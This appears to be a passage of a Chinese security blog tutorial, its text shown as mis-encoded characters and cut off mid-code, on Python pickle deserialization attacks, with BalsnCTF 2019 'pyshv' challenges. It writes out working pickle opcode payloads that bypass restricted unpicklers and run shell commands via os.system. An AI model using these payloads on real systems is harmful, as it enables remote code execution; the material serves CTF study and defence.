<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/bc66e3be-c891-4c13-ba24-a1db7cc29ecf.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>åŒæ—¶ï¼Œä¹Ÿç»™å‡ºäº†å®‰å…¨ä½¿ç”¨ pickle çš„æœ€ä½³å®è·µï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/a7951335-6080-420d-a558-544c50aa2f2d.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>å½“åºåˆ—åŒ–ä¸­ opcode å‡ºç° <code>c</code>ã€<code>i</code>ã€<code>b'\x93'</code> æ—¶ï¼Œä¼šè°ƒç”¨ find_classã€‚åˆ©ç”¨ç™½åå•æ–¹æ³•æ¥é™åˆ¶è§£å°çš„å¯¹è±¡ä¸€èˆ¬æ˜¯æ²¡é—®é¢˜çš„ã€‚ä½†æ˜¯å¦‚æœç”¨é»‘åå•ï¼Œå°±å®¹æ˜“å‡ºç°ç–æ¼ï¼Œæ”»å‡»çš„æ€è·¯å°±æ˜¯ç”¨ mro æ¥å±‚å±‚æ·±å…¥å¯»æ‰¾é»‘åå•ä»¥å¤–çš„æ¨¡å—ã€æ–¹æ³•ï¼Œä¸æˆ‘ä¹‹å‰å†™çš„ã€ŠPython æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“ã€‹ï¼ˆè§èµ„æ–™ 1ï¼‰é‡Œæåˆ°çš„æŠ€å·§å¦‚å‡ºä¸€è¾™ï¼Œæˆ‘è¿™é‡Œå°±ä¸å•°å—¦äº†ã€‚</p>
<p>å¦‚æœä½ ç»å¸¸æ‰“ CTFï¼Œå°±ä¼šå‘ç°ç°åœ¨ Python ååºåˆ—åŒ–çš„é¢˜ç›®åŸºæœ¬ä¸Šéƒ½è¦ç”¨åˆ° find_classï¼Œåé¢ä¼šæœ‰ä¸€äº›ç»å…¸çš„é¢˜ç›®ã€‚ä½œä¸ºé¢˜ç›®éš¾åº¦æ§åˆ¶å™¨ï¼Œéœ€è¦å’Œå…¶ä»–åœºæ™¯è”åˆèµ·æ¥å»çœ‹å¦‚ä½•ç»•è¿‡ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œå°±ä¸å•ç‹¬ä¸¾ä¾‹è¯´æ˜äº†ã€‚</p>
<h4 id="å˜é‡ä¸æ–¹æ³•è¦†ç›–">å˜é‡ä¸æ–¹æ³•è¦†ç›–</h4>
<p>ä¸¾ä¸ªä¾‹å­ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">PWD = <span class="hljs-string">&quot;???&quot;</span>  <span class="hljs-comment"># å·²æ‰“ç </span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(ser)  <span class="hljs-comment"># è¾“å…¥ç‚¹</span><br>        <span class="hljs-keyword">if</span> obj.pwd == PWD:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œå¯ä»¥é€šè¿‡ import <code>builtins</code> æ¥è¦†ç›– <code>globals</code> é‡Œçš„ <code>PWD</code>ï¼Œè½¬æˆä»£ç å°±æ˜¯è¿™æ ·ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><br>builtins.<span class="hljs-built_in">globals</span>()[<span class="hljs-string">&quot;PWD&quot;</span>] = <span class="hljs-string">&quot;tr0y&quot;</span>  <span class="hljs-comment"># å…ˆæŠŠ PWD æ”¹æˆä¸€ä¸ªå€¼</span><br><br>obj.pwd = <span class="hljs-string">&quot;tr0y&quot;</span>  <span class="hljs-comment"># å†è®© obj.pwd ä¹Ÿç­‰äºè¿™ä¸ªå€¼</span><br></code></pre></td></tr></table></figure></p>
<p>è½¬æˆ opcode å°±æ˜¯ï¼š<code>cbuiltins\nglobals\n(tR(VPWD\nVtr0y\nu.</code>ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ­¤æ—¶ obj å®é™…ä¸Šæ˜¯å­—å…¸ï¼Œå®ƒå¹¶æ²¡æœ‰ pwd è¿™ä¸ªå±æ€§ï¼Œæ‰€ä»¥åœ¨ if åˆ¤æ–­çš„æ—¶å€™å°±ä¼šç›´æ¥æŠ¥é”™ã€‚</p>
<p>è§£å†³çš„åŠæ³•å°±æ˜¯ç”¨ <code>0</code> æŠŠæ ˆé‡Œçš„ <code>builtins.globals()</code> å¼¹å‡ºï¼Œå®ƒå·²ç»å®Œæˆäº†è‡ªå·±ä¿®æ”¹ PWD å€¼çš„ä½¿å‘½ï¼›ç„¶åå†å‹å…¥ä¸€ä¸ª Target å®ä¾‹ï¼Œå¹¶è®©å®ƒçš„ pwd å±æ€§ç­‰äº tr0yï¼Œè¿™æ ·å°±å¯ä»¥è®© <code>obj.pwd</code> çš„å€¼ä¸ PWD ä¸€è‡´ï¼š<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>(tR(VPWD<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>u0c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>)\x81&#125;(Vpwd<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>ub.<br>                                      ^<br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/718dacd3-1f33-4952-ab51-94eb585e786c.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>è¿™é‡Œä½ å¯èƒ½ä¼šæƒ³ï¼Œ<code>builtins.globals()</code> æ˜¯å­—å…¸ï¼Œè€Œ Python ä¸­ä¸€åˆ‡çš†å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—å…¸ä¹Ÿæ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œè¿™æ ·å²‚ä¸æ˜¯ä¹Ÿå¯ä»¥ç”¨ <code>b</code> æ¥ç»™è¿™ä¸ªå­—å…¸æ–°å¢ä¸€ä¸ªå±æ€§ï¼Ÿè¿™æ · payload å°±ç®€æ´å¾—å¤šï¼š<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>(tR(VPWD<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>u&#125;(Vpwd<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>ub.<br></code></pre></td></tr></table></figure><br />
é—æ†¾çš„æ˜¯ï¼Œå‰é¢æåˆ°è¿‡ï¼Œ<code>b</code> æ˜¯æ‰§è¡Œ <code>__dict__.update()</code>ï¼Œè€Œå­—å…¸æ˜¯æ²¡æœ‰ <code>__dict__</code> è¿™ä¸ªå±æ€§çš„ï¼Œæ‰€ä»¥æ²¡æ³•é€šè¿‡ b ç»™å®ƒæ–°å¢ä¸€ä¸ªå±æ€§ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/4ba4c6a5-8e35-46df-8f21-f418b2661b8c.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>å½“ç„¶ï¼Œä¸ä»…å˜é‡å¯ä»¥è¢«è¦†ç›–ï¼Œæ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥è¢«è¦†ç›–çš„ã€‚æ¯”å¦‚ <code>sys.modules.get("os")</code>ï¼Œå¯ä»¥å…ˆç”¨ä»£ç ç†æ¸…æ¥šé“¾è·¯ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>p0 = sys.modules<br>p0[<span class="hljs-string">&quot;sys&quot;</span>] = p0<br><span class="hljs-keyword">import</span> sys<br>p0[<span class="hljs-string">&quot;sys&quot;</span>] = sys.get(<span class="hljs-string">&quot;os&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>è½¬æˆ opcodeï¼š<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">csys<span class="hljs-symbol">\n</span>modules<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>0g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g0<span class="hljs-symbol">\n</span>scsys<span class="hljs-symbol">\n</span>get<span class="hljs-symbol">\n</span>(Vos<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/fe49557c-a78c-4dd7-a61e-3b29ba0ca6f0.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>æ³¨æ„è¿™é‡Œçš„ import äº†ä¸¤æ¬¡ï¼Œåªæœ‰ç¬¬ä¸€æ¬¡æ˜¯çœŸæ­£æ‰§è¡Œäº† sys æ¨¡å—ï¼Œç„¶åè½½å…¥å†…å­˜ï¼Œç¬¬äºŒæ¬¡æ˜¯ä» sys.modules ç›´æ¥å¼•å…¥çš„ã€‚è¿™ä¸ªç‰¹æ€§ä¸ Python import åè®®æœ‰å…³ç³»ï¼Œå®ƒç”±ä¸¤ä¸ªæ¨¡å—æ„æˆï¼ŒæŸ¥æ‰¾å™¨å’ŒåŠ è½½å™¨ã€‚å¯¼å…¥è¯¦ç»†æœºåˆ¶å¯çœ‹èµ„æ–™ 5ã€‚</p>
<p>æ‰€ä»¥ï¼Œè¿™ä¸ªæ€è·¯è¦æ±‚å¯¹ Python å†…ç½®çš„ä¸€äº›å±æ€§ã€æ–¹æ³•ã€æ¨¡å—æœ‰æ‰å®çš„æŒæ¡ã€‚æ¯”å¦‚æŒ‰ç…§ Python æ–‡æ¡£çš„æ„æ€æ¥çœ‹ï¼Œå±æ€§åŒ…æ‹¬ <code>æ•°æ®å±æ€§</code> å’Œ <code>æ–¹æ³•</code>ï¼Œæ‰€ä»¥ä¸¥æ ¼æ¥è¯´ï¼Œæˆ‘ä»¬å¸¸è¯´çš„<code>å±æ€§</code>ä¸€è¯ï¼Œå…¶å®ç‰¹æŒ‡ <code>æ•°æ®å±æ€§</code>ï¼ˆè¿™ä¸€ç‚¹æ²¡å¿…è¦å¤ªçº ç»“ï¼Œåæ­£å¤§å®¶éƒ½æ˜¯è¿™ä¹ˆè¯´çš„ï¼‰ã€‚è¿˜æœ‰ï¼Œå¤§å®¶å¯èƒ½ä¹ æƒ¯æ€§ç”¨ <code>dir()</code> æ¥æŸ¥çœ‹å±æ€§å’Œæ–¹æ³•ï¼Œå…¶å®å®ƒåœ¨å‚æ•°ä¸åŒçš„æ—¶å€™ï¼ŒæŸ¥è¯¢çš„é€»è¾‘æ˜¯ä¸ä¸€æ ·çš„ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/98a6e69c-927e-4960-ae87-e92636533d13.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>æˆ‘ä¸€èˆ¬æ˜¯åœ¨ ipython ä¸­ç”¨ <code>.*?</code> æ¥æŸ¥çœ‹ï¼Œä¾‹å¦‚ <code>os.*?</code>ï¼Œè¿™ä¸ªç»“æœæ˜¯éå¸¸å…¨çš„ã€‚</p>
<p>å¦å¤–ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›å¯¹è±¡çš„ <code>__dict__</code> å±äº <code>mappingproxy</code> ç±»å‹ï¼Œä¾‹å¦‚ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/37e7cf49-b026-40ee-990b-1f670522f221.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>å¦‚æœç›´æ¥ç”¨ <code>b</code> è¿™ç§å¯¹è±¡è¿›è¡Œå±æ€§ä¿®æ”¹çš„è¯ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/7b7667a1-0feb-469e-b0b5-e83d084cfa38.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>æŸ¥çœ‹ pickle çš„æºç ï¼ˆè§èµ„æ–™ 6ï¼‰å¯çŸ¥ï¼ˆæ³¨ï¼špickle æºç ä¸­æœ‰ <code>_pickle</code>ï¼ˆå³ cPickleï¼‰ä¼˜å…ˆä½¿ç”¨çš„é€»è¾‘ï¼Œå¦‚æœè¿™ä¸ªæ¨¡å—å¯¼å…¥å¤±è´¥ï¼Œæ‰ä¼šä½¿ç”¨è¿™ä¸Šé¢çš„ pickleã€‚è¿™ä¸¤ä¸ªæ¨¡å—çš„é€»è¾‘ç•¥æœ‰å·®å¼‚ï¼Œå¦‚æœæƒ³ä»”ç»†å¯¹æ¯”éœ€è¦çœ‹ä¸‹ <code>_pickle</code> çš„ C æºç ï¼‰ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œ <code>inst_dict[intern(k)] = v</code>ï¼Œè€Œ mappingproxy ç±»å‹ç¦æ­¢è¿™æ ·æ“ä½œï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/b657bcaf-d4ba-4e2a-a317-06cd0002cf17.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>é‚£ä¹ˆåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå†çœ‹æºç ï¼Œå¦‚æœ <code>state</code> æ˜¯ä¸¤ä¸ªå…ƒç´ çš„å…ƒç»„ï¼Œé‚£ä¹ˆä¼šæ‰§è¡Œ <code>state, slotstate = state</code>ï¼Œå¦‚æœæ­¤æ—¶ <code>state in [None, &#123;&#125;]</code>ï¼ˆç”±äº <code>_pickle</code> é€»è¾‘é—®é¢˜ï¼Œæ˜¯æ²¡åŠæ³•è®© state ç­‰äº <code>''</code>ã€<code>0</code> ç­‰è¿™ç§å€¼çš„ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šè·‘å»æ‰§è¡Œ <code>setattr(inst, k, v)</code>ï¼Œè¿™æ˜¯ mappingproxy ç±»å‹å…è®¸çš„ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/ee98ebcb-fb16-4fc0-9436-d18b86626b6c.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>æ‰€ä»¥ï¼Œå‡å¦‚æœ‰ä¸€ä¸ªåº“æ˜¯ Aï¼Œé‡Œé¢æœ‰ä¸ªç±» bï¼Œè¦ä¿®æ”¹ b çš„å±æ€§ï¼ŒåŸæœ¬è¦æ‰§è¡Œçš„ <code>cA\nb\n&#125;Va\nI1\nsb.</code> åº”è¯¥æ”¹ä¸º <code>cA\nb\n(N&#125;Va\nI1\ntsb.</code> æˆ–è€… <code>cA\nb\n(&#125;&#125;Va\nI1\ntsb.</code></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/3d00a59a-bb3c-4c71-93ee-e7eb1a7719c8.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h2 id="è¯¾åé¢˜">è¯¾åé¢˜</h2>
<p>è¿™ä¸‰é“é¢˜ç›®æ˜¯ 2019 å¹´çš„ BalsnCTFï¼Œéå¸¸ç»å…¸çš„ Python ååºåˆ—åŒ–é¢˜ï¼Œæºç è§èµ„æ–™ 7</p>
<h3 id="pyshv1">pyshv1</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><br>whitelist = []<br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(<span class="hljs-variable language_">self</span>, module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> sys<br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;sys&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br></code></pre></td></tr></table></figure>
<p>é™åˆ¶æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>åªèƒ½å¼•å…¥ sys æ¨¡å—</li>
<li>æ–¹æ³•ä¸­ä¸èƒ½æœ‰ <code>.</code></li>
</ol>
<p>è¿™é¢˜æ¯”è¾ƒç®€å•ï¼Œåˆ©ç”¨æ–¹æ³•è¦†ç›–çš„æ€è·¯ï¼Œ<code>sys.modules.get("os").system("whoami")</code> å°±å¯ä»¥äº†ï¼Œè½¬ä¸º opcode å³ä¸ºï¼š<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">csys<span class="hljs-symbol">\n</span>modules<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>0g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g0<span class="hljs-symbol">\n</span>scsys<span class="hljs-symbol">\n</span>get<span class="hljs-symbol">\n</span>(Vos<span class="hljs-symbol">\n</span>tR  # åˆ°è¿™é‡Œå’Œä¸Šé¢æ–¹æ³•è¦†ç›–ä¸­çš„ payload ä¸€æ ·<br>p1<span class="hljs-symbol">\n</span>0  # æŠŠ os å­˜ä¸‹æ¥å…ˆï¼Œç„¶åæ¸…ç©ºæ ˆ<br>g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g1<span class="hljs-symbol">\n</span>s   # å¼•å…¥ sys.modules å¹¶ä»¤ sys.modules[&quot;sys&quot;] = osï¼Œè¿™ä¸ªæ€è·¯è¿˜æ˜¯æ–¹æ³•è¦†ç›–<br>csys<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>tR.  # æ‰§è¡Œå‘½ä»¤<br></code></pre></td></tr></table></figure></p>
<p>åœ¨ç»è¿‡ä¸¤è½®è¦†ç›– sys ä¹‹åï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ï¼š<br />
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/b27d5d62-53a7-4aab-9505-289c28ddca40.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h3 id="pyshv2">pyshv2</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- structs.py ----- </span><br><span class="hljs-comment"># structs.py æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶</span><br><br><br><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        module = <span class="hljs-built_in">__import__</span>(module)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> sys<br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;structs&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;<br>            <span class="hljs-string">&#x27;help&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_help,<br>            <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_flag,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title 